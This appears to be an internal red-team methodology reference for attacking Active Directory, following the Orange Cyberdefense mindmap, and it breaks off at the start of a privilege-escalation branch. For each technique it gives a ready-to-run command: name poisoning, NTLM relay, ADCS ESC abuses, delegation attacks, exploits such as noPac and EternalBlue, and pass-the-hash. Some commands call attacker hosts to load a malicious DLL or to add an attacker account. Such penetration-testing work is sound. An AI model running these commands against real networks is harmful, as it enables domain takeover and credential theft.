# Orange Cyberdefense — Active Directory Red Team Mindmap (v2025.03)

Canonical methodology reference for internal AD red teaming, structured as the OCD mindmap.
Each `## Branch` is a phase. Each `### Technique` is a discrete action with mechanism, command,
preconditions, effects, and links to TAR action YAMLs and HackTricks/PAT references.

Source: https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
Imported: 2026-04-20

---

## Branch 0 — Goals and decision tree

The OCD mindmap encodes the answer to one operator question: **given my current access level, what
is the highest-information-gain next move?** Branches map to access tiers:

| Tier | What you have | What you want |
|---|---|---|
| 0 | Network access only | Any credential or hash |
| 1 | One low-priv credential | LAPS / GMSA / privileged user / domain enum |
| 2 | Privileged user (helpdesk, server admin) | Domain Admin path |
| 3 | Domain Admin | Forest Admin / persistence |
| 4 | Forest Admin | Cloud / hybrid / cross-org |

Decision rule embedded in every branch: **prefer the action that flips a tier boundary** over
incremental enumeration. A blind kerberoast that yields a crackable hash is worth more than five
LDAP queries that confirm what BloodHound already showed.

---

## Branch 1 — Zero access, no credentials

Operator just connected to the wire. No creds, no domain context. Goal: produce a credential.

### Network discovery (passive + active)
**Mechanism**: Passive ARP/CDP/LLDP listening reveals neighbor structure without sending packets.
Active scans probe hosts, services, and SMB version banner.
**Command**: `nmap -sV -sC --version-all -p- --min-rate 1000 -oA scan TARGET_RANGE`
**Prereq**: layer-2 access to the target VLAN.
**Effect**: hosts/services populated in WM.
**TAR action**: `actions/recon/nmap_full.yml`, `actions/recon/nmap_scripts.yml`
**Source**: HackTricks `pentesting-network/`, OCD branch 1.

### LLMNR/NBT-NS/mDNS poisoning (Responder)
**Mechanism**: Windows hosts query LLMNR/NBT-NS for unresolved names. Responder answers
authoritatively, baits the host into a NetNTLM authentication, captures the challenge-response.
**Command**: `responder -I tun0 -wd` then wait. Crackable hashes appear in
`/usr/share/responder/logs/`.
**Prereq**: same broadcast domain as targets, no network segmentation blocking UDP 137/138/5355.
**Effect**: `netntlmv2_hash_captured`, `has_hash`.
**TAR action**: `actions/ad/responder.yml`
**Source**: HackTricks `windows-hardening/active-directory-methodology/`, OCD branch 1.

### IPv6 takeover (mitm6 + ntlmrelayx)
**Mechanism**: Windows prefers IPv6 over IPv4. mitm6 advertises itself as the DNS server via
DHCPv6 RA. Hosts then resolve internal names through the attacker. Combined with ntlmrelayx for
LDAPS relay, this becomes domain-wide DA in minutes against an unhardened environment.
**Command**: `mitm6 -d DOMAIN.LOCAL` + `ntlmrelayx.py -6 -t ldaps://DC -wh attacker --delegate-access`
**Prereq**: same broadcast domain, no DHCPv6 guard on switches, LDAP signing not enforced.
**Effect**: `has_machine_account_compromise`, `domain_admin_path_via_rbcd`.
**TAR action**: `actions/ad/mitm6.yml` + `actions/ad/ntlmrelayx_ldap.yml`
**Source**: HackTricks `pentesting-network/spoofing-ssdp-and-upnp-devices.md`, dirkjanm.io.

### Coercion without credentials (PetitPotam unauth + WebClient relay)
**Mechanism**: Pre-2022 patched DCs accept anonymous EFSRPC calls and authenticate to any
attacker-supplied SMB target. Combine with WebClient/HTTP coercion for LDAP relay paths.
**Command**: `python3 PetitPotam.py -u '' -p '' ATTACKER_IP DC_IP`
**Prereq**: DC unpatched (CVE-2021-36942), SMB reachable from DC to attacker host.
**Effect**: `dc_machine_hash_captured`, then `adcs_relay_to_dc_cert` if ADCS Web Enrolment present.
**TAR action**: `actions/ad/petitpotam_unauth.yml`
**Source**: HackTricks `windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md`.

### Blind kerberoast (CVE-2022-33679 / pre-auth less)
**Mechanism**: AS-REQ to TGT for users where pre-auth is disabled returns AS-REP encrypted with
the user's NTLM hash — crackable. Even without an account, you can enumerate principals via
KRB-ERROR responses (PRINCIPAL_UNKNOWN vs PREAUTH_REQUIRED).
**Command**: `python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP`
**Prereq**: list of candidate usernames (OSINT/LinkedIn), DC reachable port 88.
**Effect**: `asreproast_hash_captured`, `has_hash`, `valid_username_enumerated`.
**TAR action**: `actions/ad/asreproast.yml`, new `actions/ad/blind_kerberoast.yml`
**Source**: impacket GetNPUsers, OCD branch 1.

### TimeRoasting (RID-based, no auth)
**Mechanism**: NTP Authenticated Mode supports MS-SNTP extension. The DC responds with a hash
calculated from the computer account's RC4 key. No credentials needed; just the RID. Crack
to reveal the machine account password.
**Command**: `python3 timeroast.py DC_IP -o hashes.txt` (Tom Tervoort's tool)
**Prereq**: NTP/UDP-123 reachable, DC running unpatched W32time.
**Effect**: `machine_account_hash_captured`, `has_hash`.
**TAR action**: new `actions/ad/timeroast.yml`
**Source**: Secura blog "TimeRoasting", OCD branch 1.

### PXE credential capture
**Mechanism**: SCCM PXE-enabled distribution points serve the boot image after a network-boot
request. The image often contains the Network Access Account credential in cleartext (TFTP)
or trivially-decryptable (HTTP). PXEThief automates the request + decrypt cycle.
**Command**: `python3 PXEThief.py automatic eth0`
**Prereq**: layer-2 access to a PXE-enabled SCCM DP, DHCP option 60/66/67 broadcasting.
**Effect**: `naa_credentials_captured`, `valid_domain_credential`.
**TAR action**: new `actions/sccm/sccm_pxe_hashcap.yml`
**Source**: Christopher Panayi "Pixie", `tw1sm/PXEThief`, OCD branch 1.

---

## Branch 2 — Network recon with no credentials

### SMB anonymous / null session
**Mechanism**: Pre-Windows-2003 default allowed `IPC$` enumeration with empty username/password.
Modern hardened DCs disable this; misconfigured SMB servers (NAS, printers) often allow.
**Command**: `smbclient -L //TARGET -N` and `enum4linux-ng -A TARGET`
**Prereq**: SMB port 445 reachable, RestrictAnonymous=0 or RestrictNullSessAccess=0.
**Effect**: `share_list_obtained`, sometimes `user_list_enumerated`.
**TAR action**: `actions/smb/smb_null_session.yml`, `actions/smb/enum4linux.yml`

### LDAP anonymous bind
**Mechanism**: Some DCs allow anonymous LDAP bind, exposing user/group enumeration via OID search.
Even with a refused bind, errors leak naming context.
**Command**: `ldapsearch -x -H ldap://DC -b "DC=domain,DC=local" -s sub "(objectClass=user)" sAMAccountName`
**Prereq**: LDAP port 389 reachable, dsHeuristics anonymous bit set or DC misconfigured.
**Effect**: `domain_naming_context_known`, possibly `user_list_enumerated`.
**TAR action**: `actions/ad/ldap_anonymous.yml`

### SNMP community string brute
**Mechanism**: SNMP v1/v2c authenticates by community string. Default `public`/`private` strings
expose the system MIB including ARP table, running processes, sometimes Windows usernames.
**Command**: `onesixtyone -c communities.txt -i hosts.txt`
**Prereq**: UDP 161 reachable, default or weak community.
**Effect**: `process_list_enumerated`, `arp_neighbors_enumerated`.
**TAR action**: `actions/services/snmp_brute.yml`

### Kerberos username enumeration
**Mechanism**: AS-REQ for valid username returns either KRB5KDC_ERR_PREAUTH_REQUIRED (valid)
or KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN (invalid). No password required, no account lockout impact.
**Command**: `kerbrute userenum -d DOMAIN --dc DC_IP users.txt`
**Prereq**: DC port 88 reachable, list of candidate usernames.
**Effect**: `valid_username_enumerated`.
**TAR action**: `actions/ad/kerbrute_userenum.yml`

---

## Branch 3 — One credential obtained: spraying and discovery

### Password spraying (low-and-slow, no lockout)
**Mechanism**: Try one likely password (`Spring2026!`, `Welcome1`, `Company2025!`) against every
user. Lockout-policy-aware so no account is locked. Single weak password reveals dozens of holders.
**Command**: `kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Spring2026!'`
**Prereq**: domain naming, user list, knowledge of lockout threshold (typically 5 attempts/30 min).
**Effect**: `valid_domain_credential` (potentially many).
**TAR action**: `actions/ad/kerbrute_spray.yml`

### Authenticated SMB enum
**Mechanism**: With one credential, enumerate all shares, sessions, logged-on users across the
domain. crackmapexec compresses this into a one-liner.
**Command**: `nxc smb 192.168.0.0/24 -u USER -p PASS --shares --sessions --loggedon-users`
**Prereq**: one valid credential.
**Effect**: hosts/shares/sessions populated.
**TAR action**: `actions/smb/crackmapexec_smb.yml`

### BloodHound collection
**Mechanism**: SharpHound/BloodHound.py walks LDAP+SAMR+ADWS to enumerate users, groups, ACLs,
sessions, GPO links, trusts. The collected JSON imports into BloodHound's Neo4j; cypher queries
reveal attack paths previously hidden in LDAP soup.
**Command**: `bloodhound-python -d DOMAIN -u USER -p PASS -ns DC_IP -c All -dc DC_NAME`
**Prereq**: one valid credential, LDAP reachable, optionally SMB for session collection.
**Effect**: `bloodhound_data_collected`, attack paths queryable.
**TAR action**: `actions/ad/bloodhound.yml`
**Cypher library**: `/home/kali/knowledge/cypher/`

### LAPS / GMSA reading (pre-promotion)
**Mechanism**: Local Admin Password Solution stores random local admin passwords in
`ms-Mcs-AdmPwd`. ACL determines who can read. Many environments accidentally grant Domain Users.
GMSA passwords (`msDS-ManagedPassword`) similarly readable by `PrincipalsAllowedToRetrieve`.
**Command**: `nxc ldap DC -u USER -p PASS -M laps` and `gMSADumper.py -u USER -p PASS -d DOMAIN`
**Prereq**: ACL grants read on `ms-Mcs-AdmPwd` or `msDS-ManagedPassword` to current user.
**Effect**: `laps_password_obtained` or `gmsa_password_obtained` → `local_admin_credential`.
**TAR action**: `actions/ad/laps_dump.yml`, `actions/ad/gmsa_dump.yml`

### Targeted Kerberoast (write-protected SPN injection)
**Mechanism**: If you have GenericWrite/WriteProperty over a user, set their `servicePrincipalName`
to a synthetic SPN, kerberoast, then unset it. Catches accounts that aren't otherwise
kerberoastable.
**Command**: `targetedKerberoast.py -u USER -p PASS -d DOMAIN`
**Prereq**: WriteProperty over `servicePrincipalName` of one or more user objects (BloodHound
edge: `WriteSPN`).
**Effect**: `tgs_hashes_obtained`, `has_hash`.
**TAR action**: new `actions/ad/targeted_kerberoast.yml`

### Standard Kerberoast and ASREPRoast
**Mechanism**: Kerberoast: TGS for SPN-bearing user is encrypted with that account's hash;
crackable offline. ASREPRoast: pre-auth-disabled accounts return AS-REP encrypted with the
user's hash; crackable.
**Command**: `GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC -request` and `GetNPUsers.py DOMAIN/ -usersfile`
**Prereq**: any valid credential (Kerberoast); user list (ASREPRoast).
**Effect**: `tgs_hashes_obtained` / `asreproast_hash_captured`.
**TAR action**: `actions/ad/kerberoast.yml`, `actions/ad/asreproast.yml`

---

## Branch 4 — Credential capture (network position required)

### Responder + ntlmrelayx (SMB→SMB)
**Mechanism**: Responder poisons name resolution → host authenticates with NetNTLMv2 → ntlmrelayx
relays the auth to a target SMB host where the user has admin rights. SMB signing must be
disabled on the target.
**Command**: `responder -I tun0 -A` (analyze only) + `ntlmrelayx.py -tf targets.txt -smb2support -socks`
**Prereq**: target SMB has signing disabled, attacker has L2/L3 access enabling poisoning.
**Effect**: `relay_admin_session_active`, often `secretsdump_succeeded`.
**TAR action**: `actions/ad/ntlmrelayx_smb.yml`

### Kerberos Relay (KrbRelayUp local privesc)
**Mechanism**: Coerce the local machine to authenticate to itself via Kerberos, relay through
LDAP to write to its own machine account (RBCD). Then S4U2self+S4U2proxy as a privileged user
to itself = SYSTEM. Patched in 2022 but still applicable on legacy hosts.
**Command**: `KrbRelayUp.exe relay -m rbcd`
**Prereq**: local user on a domain-joined machine, machine account creation quota > 0 (default
ms-DS-MachineAccountQuota = 10).
**Effect**: `local_system_obtained`.
**TAR action**: new `actions/ad/krbrelayup.yml`

### NTLM theft via file drops
**Mechanism**: Plant `desktop.ini` / `.url` / `.lnk` / `.scf` files in a writable share. When a
victim browses, their Explorer fetches the embedded UNC path and emits NetNTLM auth.
**Command**: `ntlm_theft -g all -s ATTACKER_IP -f bait`
**Prereq**: write access to a frequented share.
**Effect**: `netntlmv2_hash_captured` (often privileged users).
**TAR action**: new `actions/ad/ntlm_theft_file_drop.yml`

---

## Branch 5 — NTLM Relay tree

### Relay matrix
| Source coercion | Target protocol | Outcome |
|---|---|---|
| Responder/mitm6 | SMB (signing off) | Admin session, secretsdump |
| Responder/mitm6 | LDAP (signing off) | Add to group, set RBCD |
| mitm6 / WebClient | LDAPS | Above + cert template enrol |
| Responder | MSSQL (Windows auth) | Code exec via xp_cmdshell |
| WebClient | HTTP (ADCS) | Cert-on-behalf, then PKINIT auth as victim |
| WSUS coerce | HTTP (WSUS) | Push malicious update to client |
| Responder | RPC | DCOM execution paths (rare) |

### NTLM relay to ADCS (ESC8)
**Mechanism**: PetitPotam/PrinterBug coerces DC → relay to HTTP endpoint of ADCS Web Enrolment →
request DC certificate using the relayed NetNTLM auth → PKINIT with the resulting cert as DC$ →
DCSync.
**Command**: `ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController`
+ `python3 PetitPotam.py -u '' -p '' ATTACKER DC`
**Prereq**: ADCS Web Enrolment without EPA, DC unpatched against unauth EFSRPC.
**Effect**: `dc_certificate_obtained`, `dc_pkinit_tgt`, `domain_admin_via_dcsync`.
**TAR action**: `actions/ad/ntlmrelayx_adcs.yml`

### NTLM relay to LDAP for RBCD
**Mechanism**: Relay machine-account auth to LDAP. With WriteProperty on the source machine
account, set its `msDS-AllowedToActOnBehalfOfOtherIdentity` to a controlled computer. Then use
S4U2self/S4U2proxy to impersonate any user against the source machine.
**Command**: `ntlmrelayx.py -t ldap://DC --delegate-access --escalate-user PWNED$ --no-smb-server`
**Prereq**: LDAP signing not required, or LDAPS without channel binding.
**Effect**: `rbcd_configured`, `arbitrary_user_impersonation`.
**TAR action**: `actions/ad/ntlmrelayx_ldap.yml`

### NTLM relay to MSSQL
**Mechanism**: SQL Server with Windows authentication accepts NetNTLM relays. Once relayed as
a sysadmin, enable xp_cmdshell for code execution.
**Command**: `ntlmrelayx.py -t mssql://SQL_SERVER -socks`
**Prereq**: SQL Server uses Windows auth, current relayed user has sysadmin.
**Effect**: `mssql_sysadmin_session`, `code_execution_on_sql_host`.
**TAR action**: `actions/ad/ntlmrelayx_mssql.yml`

### WSUS relay (PyWSUS / SharpWSUS)
**Mechanism**: WSUS clients fetch updates from a configured WSUS URL. If HTTP (not HTTPS), an
in-path attacker can serve a malicious update with a signed-by-Microsoft binary as the executable
(PsExec.exe is the canonical pick — signed and lets you exec arbitrary commands).
**Command**: `python3 pywsus.py -H ATTACKER -p 8530 --executable PsExec64.exe --command 'net user attacker P@ssw0rd /add'`
**Prereq**: WSUS configured with HTTP not HTTPS, ARP/DNS poisoning to redirect.
**Effect**: `client_code_execution_via_wsus_update`.
**TAR action**: new `actions/ad/wsus_relay.yml`

---

## Branch 6 — Kerberos Delegation

### Unconstrained Delegation (PrinterBug → DC TGT)
**Mechanism**: Computers with `TRUSTED_FOR_DELEGATION` flag receive forwardable TGTs of every
user that authenticates to them. Coerce the DC to authenticate (PrinterBug, PetitPotam) → DC's
TGT lands in the unconstrained-delegation host's LSASS → extract → DCSync.
**Command**: `Rubeus.exe monitor /interval:1` then trigger PrinterBug from controlled host.
**Prereq**: control of a host with TRUSTED_FOR_DELEGATION (BloodHound query: `MATCH (c:Computer
{unconstraineddelegation:true}) RETURN c`), DC reachable for coercion.
**Effect**: `dc_tgt_captured`, `domain_admin_via_pth`.
**TAR action**: `actions/ad/unconstrained_delegation.yml`

### Constrained Delegation (S4U2proxy abuse)
**Mechanism**: Account with `msDS-AllowedToDelegateTo` can request service tickets to a
specific SPN on behalf of any user (including DA) via S4U2self+S4U2proxy. Compromised the
delegating account = compromised any service it can reach.
**Command**: `getST.py -spn cifs/dc.domain.local -impersonate Administrator DOMAIN/SVC:PASS`
**Prereq**: credential or hash of an account with non-empty `msDS-AllowedToDelegateTo`.
**Effect**: `service_ticket_for_target_spn`, often `local_admin_on_target`.
**TAR action**: `actions/ad/constrained_delegation.yml`

### Resource-Based Constrained Delegation (RBCD)
**Mechanism**: `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer lists which
principals can request tickets to it on behalf of others. With WriteProperty over that target,
add a controlled computer account → S4U as DA against the target.
**Command**: `dacledit.py -action write -rights ResetPassword DOMAIN/USER:PASS -target VICTIM` (variant);
canonical: `rbcd.py -delegate-from PWNED$ -delegate-to TARGET$ -action write DOMAIN/USER:PASS`
**Prereq**: WriteProperty on the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`, controlled
computer account (create one via `addcomputer.py` if MachineAccountQuota>0).
**Effect**: `rbcd_configured`, `local_admin_on_target_via_s4u`.
**TAR action**: `actions/ad/rbcd.yml`

### Shadow Credentials (Whisker / pyWhisker)
**Mechanism**: Add a key pair to the target's `msDS-KeyCredentialLink`. Then PKINIT-auth as the
target using that key. Persistence-style alternative to password reset on accounts where you have
WriteProperty but want to avoid disrupting the user.
**Command**: `pywhisker.py -d DOMAIN -u USER -p PASS --target VICTIM --action add`
**Prereq**: WriteProperty over `msDS-KeyCredentialLink` of target (BloodHound: `AddKeyCredentialLink`).
**Effect**: `pkinit_auth_as_target`, `target_credential_obtained`.
**TAR action**: `actions/ad/shadow_credentials.yml`

### S4U2self + U2U (Sapphire Ticket prep)
**Mechanism**: S4U2self lets a service request a ticket to itself on behalf of any user. Combined
with golden ticket forging, allows arbitrary impersonation without re-issuing TGTs.
**Command**: `getST.py -self -impersonate Administrator -altservice 'cifs/target' DOMAIN/SVC:PASS`
**Prereq**: any service principal credential.
**Effect**: `arbitrary_user_st_for_local_service`.

---

## Branch 7 — ADCS attack tree (ESC1-ESC15)

### ESC1 — Vulnerable certificate template (subject in SAN)
**Mechanism**: Template flagged `ENROLLEE_SUPPLIES_SUBJECT` lets the requester specify any subject
including UPN. Request a cert with `Administrator@domain` as UPN → PKINIT as Administrator.
**Command**: `certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable -enabled`; then
`certipy req -u USER -p PASS -ca CA -template VULN -upn Administrator@DOMAIN`
**Prereq**: enrol rights on a template with ENROLLEE_SUPPLIES_SUBJECT + EKU AnyPurpose/ClientAuth.
**Effect**: `arbitrary_user_certificate`, `domain_admin_via_pkinit`.
**TAR action**: `actions/ad/adcs_esc1.yml`

### ESC2 — Any-Purpose EKU
**Mechanism**: Templates with `Any Purpose EKU` or `SubCA` are usable for client authentication
even without the explicit ClientAuth EKU.
**TAR action**: `actions/ad/adcs_esc2.yml`

### ESC3 — Enrol agent template
**Mechanism**: Template with `Certificate Request Agent` EKU lets the holder request certificates
on behalf of others without their consent.
**TAR action**: `actions/ad/adcs_esc3.yml`

### ESC4 — Vulnerable template ACL
**Mechanism**: Write access on a template object lets you turn any safe template into ESC1.
**TAR action**: `actions/ad/adcs_esc4.yml`

### ESC5 — Vulnerable PKI object ACL
**Mechanism**: Control over CA computer object, CA's certificate chain, or NTAuthCertificates
container = root the entire PKI.
**TAR action**: `actions/ad/adcs_esc5.yml`

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
**Mechanism**: With this CA-wide flag set, *any* template enrolment can specify the UPN via
attribute extension. Effectively turns every enrol-able template into ESC1.
**Command**: `certipy req -u USER -p PASS -ca CA -template User -upn Administrator@DOMAIN`
**TAR action**: `actions/ad/adcs_esc6.yml`

### ESC7 — Vulnerable CA ACL
**Mechanism**: ManageCA / ManageCertificates rights on the CA itself = approve any pending
request, set CA flags, or self-issue.
**TAR action**: `actions/ad/adcs_esc7.yml`

### ESC8 — NTLM relay to AD CS HTTP endpoint (covered in Branch 5)

### ESC9 — No-Security-Extension template
**Mechanism**: Template with `msPKI-Enrollment-Flag` = `CT_FLAG_NO_SECURITY_EXTENSION` does not
embed the requester SID. With WriteProperty on a victim's `userPrincipalName`, set it to
"Administrator", request a cert (no SID check), then change UPN back.
**Command**: `certipy account update -upn 'administrator@DOMAIN' -user VICTIM -u USER -p PASS` →
`certipy req -u VICTIM -p PASS -ca CA -template ESC9_TEMPLATE`
**Prereq**: WriteProperty on UPN of a victim, ESC9-vulnerable template, StrongCertificateBindingEnforcement<2.
**Effect**: `arbitrary_user_certificate`, `domain_admin_via_pkinit`.
**TAR action**: new `actions/ad/adcs_esc9.yml`

### ESC10 — Weak certificate mappings
**Mechanism**: Two flavors. ESC10-1: `CertificateMappingMethods` registry on DC permits weak
explicit-mapping → spoof altSecurityIdentities to map cert to admin. ESC10-2: weak UPN-based
implicit mapping when StrongCertificateBindingEnforcement<2.
**Command**: similar to ESC9 with UPN swap.
**Prereq**: registry weak setting on DC, WriteProperty on victim.
**Effect**: `arbitrary_user_certificate`, `domain_admin_via_pkinit`.
**TAR action**: new `actions/ad/adcs_esc10.yml`

### ESC11 — IF_ENFORCEENCRYPTICERTREQUEST off (RPC enrol no-EPA relay)
**Mechanism**: When CA's `IF_ENFORCEENCRYPTICERTREQUEST` flag is off, RPC certificate enrolment
(MS-ICPR) does not require encryption. Relay NTLM into RPC for cert issuance.
**TAR action**: new `actions/ad/adcs_esc11.yml`

### ESC12 — YubiHSM-backed key recovery
**Mechanism**: When YubiHSM stores the CA private key but local-admin on the CA host can extract it
via the YubiHSM2 SDK and the CA's PIN stored locally.
**TAR action**: new `actions/ad/adcs_esc12.yml`

### ESC13 — Issuance-policy-linked group membership
**Mechanism**: A certificate issuance policy linked to a group adds that group to the cert
holder's PAC. Enrol with ESC13 template → instant member of privileged group.
**Command**: `certipy req -u USER -p PASS -ca CA -template ESC13_TEMPLATE` then check group
membership in resulting TGT.
**Prereq**: enrol rights on a template whose `msDS-OIDToGroupLink` resolves to a privileged group.
**Effect**: `privileged_group_membership_via_pac`.
**TAR action**: new `actions/ad/adcs_esc13.yml`

### ESC14 — Weak explicit mapping (altSecurityIdentities write)
**Mechanism**: Write on `altSecurityIdentities` lets you map an existing low-priv certificate to a
high-priv account. Auth as the cert → DC sees the alt mapping → log in as the high-priv account.
**Prereq**: WriteProperty on `altSecurityIdentities` of victim (typically Administrator).
**Effect**: `arbitrary_user_authentication_via_cert`.
**TAR action**: new `actions/ad/adcs_esc14.yml`

### ESC15 — Schema-flag SAN bypass via cert request envelope
**Mechanism**: Schema v1 templates lacking the EKU enforcement let an attacker craft a CSR with
multiple Application Policies; CA processes them as ClientAuth. Disclosed by IBM/X-Force in 2024.
**Command**: `certipy req -u USER -p PASS -ca CA -template SCHEMA_V1 -application-policies '1.3.6.1.5.5.7.3.2'`
**TAR action**: new `actions/ad/adcs_esc15.yml`

### Certifried (CVE-2022-26923)
**Mechanism**: With WriteProperty over a computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity`
or via creating a computer account, set its dNSHostName to that of a DC. Request a Machine
template cert. CA issues a cert with the DC's identity. PKINIT as DC$ → DCSync.
**Command**: `certipy account create -u USER -p PASS -user PWNED$ -dns DC.DOMAIN.LOCAL` then
`certipy req -u PWNED$ -p PASS -ca CA -template Machine` then `certipy auth -pfx pwned.pfx`
**Prereq**: MachineAccountQuota>0 OR WriteProperty over a computer's dNSHostName, Machine template
enrol rights for Domain Computers.
**Effect**: `dc_certificate_obtained`, `dc_pkinit_tgt`, `domain_admin_via_dcsync`.
**TAR action**: new `actions/ad/certifried.yml`

### Pass-the-certificate (Schannel LDAP)
**Mechanism**: Once you hold a PFX cert+key for any account, authenticate to LDAP/LDAPS via
Schannel without ever cracking a hash. Use for ACL enumeration as that user, or to issue more
LDAP changes.
**Command**: `certipy auth -pfx victim.pfx -dc-ip DC -ldap-shell`
**Prereq**: PFX file with private key for any AD account.
**Effect**: `authenticated_ldap_session_as_victim`.
**TAR action**: new `actions/ad/passthecert.yml`

---

## Branch 8 — ACL abuses (BloodHound edges)

### GenericAll / GenericWrite over a user
Write the user's password (`net user`/`pyad`), or set their SPN for kerberoast, or their
KeyCredentialLink for Shadow Creds.
**TAR action**: `actions/ad/acl_abuse.yml`, `actions/ad/forcechangepassword.yml`

### WriteOwner / WriteDacl over a user/group
Promote yourself to owner, then grant full control. Two-step.
**TAR action**: `actions/ad/owneredit.yml`, `actions/ad/dacledit.yml`

### AddMember on a group
Self-add to high-priv group like `Domain Admins`, `Account Operators`, `Backup Operators`.
**TAR action**: `actions/ad/addmember.yml`

### AddSelf on group
Variant of AddMember when only allowed to add yourself.

### GenericAll / GenericWrite / WriteProperty over a computer
Set `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD), `dNSHostName` (Certifried),
`msDS-KeyCredentialLink` (Shadow Creds machine variant), or `servicePrincipalName` (silver/silver).

### AllExtendedRights on a domain
DCSync rights — replicate the entire NTDS.dit.
**TAR action**: `actions/ad/dcsync.yml`

### GpLink / GpoOwner / WriteProperty on GPO
Edit the GPO XML to deploy scheduled tasks, scripts, or registry keys to all linked OUs.
**TAR action**: `actions/ad/gpo_abuse.yml`

### ForceChangePassword
Edge-specific: lets you reset the target's password without knowing the old one.

### DNSAdmins (CVE-2021-40469)
Member of DNSAdmins can configure dnscmd to load a DLL via `dnscmd /config /serverlevelplugindll` →
DLL loaded by SYSTEM context of the DNS service running on the DC.
**Command**: `dnscmd DC /config /serverlevelplugindll \\ATTACKER\share\evil.dll` then restart DNS.
**Prereq**: DNSAdmins membership, can write SMB share reachable from DC.
**Effect**: `system_on_dc`.
**TAR action**: new `actions/ad/dnsadmins.yml`

---

## Branch 9 — MS bugs and quick wins

### Zerologon (CVE-2020-1472)
**Mechanism**: Netlogon protocol uses AES-CFB8 with all-zero IV. Auth with all-zero ciphertext;
1/256 chance per attempt; on success, set DC's machine account password to empty. DCSync follows.
**TAR action**: `actions/ad/zerologon.yml`

### PrintNightmare (CVE-2021-34527)
**Mechanism**: Print Spooler `RpcAddPrinterDriver` lets any auth'd user load arbitrary DLL as
SYSTEM via the spooler service.
**TAR action**: `actions/ad/printnightmare.yml`

### noPac / sAMAccountName spoofing (CVE-2021-42278/79)
**Mechanism**: Create a computer account `PWNED$`, rename it to `DC` (no $), request TGT for it
(KDC lookup falls through to `DC$`), then S4U2self for Administrator and use `cifs` or `host` SPN
of DC.
**Command**: `noPac.py DOMAIN/USER:PASS -dc-ip DC -shell`
**Prereq**: MachineAccountQuota>0, DC unpatched against CVE-2021-42287/78.
**Effect**: `domain_admin_session`.
**TAR action**: new `actions/ad/nopac.yml`

### MS14-068 / goldenPac (legacy DCs)
**Mechanism**: Pre-patch KDC failed to verify the PAC signature, allowing a forged PAC claiming
DA membership.
**Command**: `goldenPac.py DOMAIN/USER:PASS@TARGET`
**Prereq**: DC unpatched (only legacy 2003-2008 boxes).
**Effect**: `domain_admin_session_on_target`.
**TAR action**: new `actions/ad/goldenpac_ms14068.yml`

### MS14-025 / GPP cpassword
**Mechanism**: Group Policy Preferences stored a 32-byte cpassword AES-encrypted with a publicly
documented Microsoft key. SYSVOL is readable by all auth'd users.
**Command**: `nxc smb DC -u USER -p PASS -M gpp_password`
**Prereq**: any valid credential, GPP files lingering in SYSVOL.
**Effect**: cleartext `valid_domain_credential`.
**TAR action**: new `actions/ad/gpp_cpassword.yml`

### EternalBlue (MS17-010)
**Mechanism**: SMBv1 buffer overflow in the SrvNet driver. Reliable kernel exploit on Windows 7
/ 2008 R2 / 2012 R2 unpatched.
**Command**: `python3 eternalblue_exploit7.py TARGET shellcode.bin`
**TAR action**: new `actions/services/eternalblue_ms17_010.yml`

### SMBGhost (CVE-2020-0796)
**Mechanism**: Compression header integer overflow in SMBv3.1.1. Less reliable kernel exploit on
Windows 10 1903/1909 unpatched.
**TAR action**: new `actions/privesc/smbghost_cve2020_0796.yml`

### PrivExchange (Exchange to DA)
**Mechanism**: Exchange's `EWSPushSubscription` lets any mailbox-enabled user trigger Exchange to
NTLM-auth to an attacker URL. Exchange's machine account has WriteDacl on the domain object →
relay to LDAP and grant DCSync to a controlled user.
**Command**: `python3 privexchange.py -ah ATTACKER -u USER -p PASS EXCHANGE_HOST -d DOMAIN`
**Prereq**: any mailbox user, Exchange unpatched (pre-Feb 2019), LDAP signing not required.
**Effect**: `dcsync_rights_granted`, `domain_admin`.
**TAR action**: new `actions/ad/privexchange.yml`

### Veeam CVE chain (CVE-2024-40711, CVE-2024-29855, CVE-2024-29849, CVE-2023-27532)
**Mechanism**: Veeam Backup & Replication has had multiple unauth/auth RCE and credential
exposure CVEs. CVE-2023-27532 leaks stored credentials (often DA) from the Veeam config DB. Each
new patch leaves the prior unpatched on legacy customer installs.
**Command**: `python3 CVE-2023-27532.py -t VEEAM_HOST` (and similar tools per CVE)
**Prereq**: Veeam B&R reachable, version-vulnerable.
**Effect**: `cleartext_credentials_dumped`, often `domain_admin`.
**TAR action**: new `actions/services/veeam_cve2023_27532.yml`, `actions/services/veeam_cve2024_40711.yml`,
`actions/services/veeam_cve2024_29855.yml`, `actions/services/veeam_cve2024_29849.yml`

---

## Branch 10 — Lateral movement

### Pass-the-Hash (PtH)
**Mechanism**: NTLM auth doesn't need cleartext password — the NT hash is enough. Any tool that
accepts `-H` (impacket, crackmapexec, evil-winrm) does pass-the-hash.
**Command**: `psexec.py DOMAIN/USER@TARGET -hashes :NTHASH`
**Prereq**: NT hash of an account local-admin on target.
**Effect**: `interactive_session_on_target`.

### Pass-the-Ticket (PtT) / Pass-the-Key (PtK)
**Mechanism**: Inject a captured TGT/TGS into the current logon session (klist purge + Rubeus
ptt). Auth-via-Kerberos to anything that account can reach.
**Command**: `Rubeus.exe ptt /ticket:base64ticket`
**Effect**: `kerberos_session_as_victim`.

### Execution paths
| Tool | Protocol | Notes |
|---|---|---|
| psexec.py | SMB | Drops service binary to ADMIN$, registers + starts service |
| smbexec.py | SMB | No file drop, uses cmd /c via service |
| wmiexec.py | WMI (DCOM/RPC) | Stealthier, no service registration |
| atexec.py | Task scheduler RPC | Persists 1-shot via at-job |
| dcomexec.py | DCOM (MMC, Excel) | Bypass some EDR EDR rules |
| evil-winrm | WinRM (5985/5986) | Best for admin sessions, PowerShell |

### SCM / Scheduled Task / WMI for one-shot exec
Use when SMB blocked but RPC/WMI open.

### RDP via mstsc /restrictedadmin
With NT hash, use restricted admin mode of RDP — no cleartext password needed.

---

## Branch 11 — Local privilege escalation (Windows host context)

### Token impersonation (Potato family)
